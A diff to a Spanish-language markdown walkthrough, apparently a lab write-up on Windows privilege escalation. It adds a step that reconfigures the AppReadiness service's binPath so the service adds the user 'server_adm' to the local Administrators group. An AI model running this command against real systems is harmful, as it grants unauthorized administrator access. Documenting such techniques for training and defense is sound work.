@@ -366,8 +366,20 @@ Ahora verificamos membresia del grupo `Administrators`
 ```powershell
 net localgroup Administrators
 ```
+En la salida se muestran los miembros del grupo Administrators. Vemos que no pertenecemos al grupo.
 
 <img width="728" height="182" alt="image" src="https://github.com/user-attachments/assets/cff5c506-0d13-4e82-a2dc-847806cad900" />
+
+Luego modificamos la ruta binaria del servicio `Service Binary Path`:
+
+```powershell
+sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+<img width="856" height="178" alt="image" src="https://github.com/user-attachments/assets/122b2bce-e233-4431-9bda-92576ecd74ce" />
+
+Vemos que la modificación de la configuración del servicio (binPath) fue aceptada. 
+
+
 
 
 
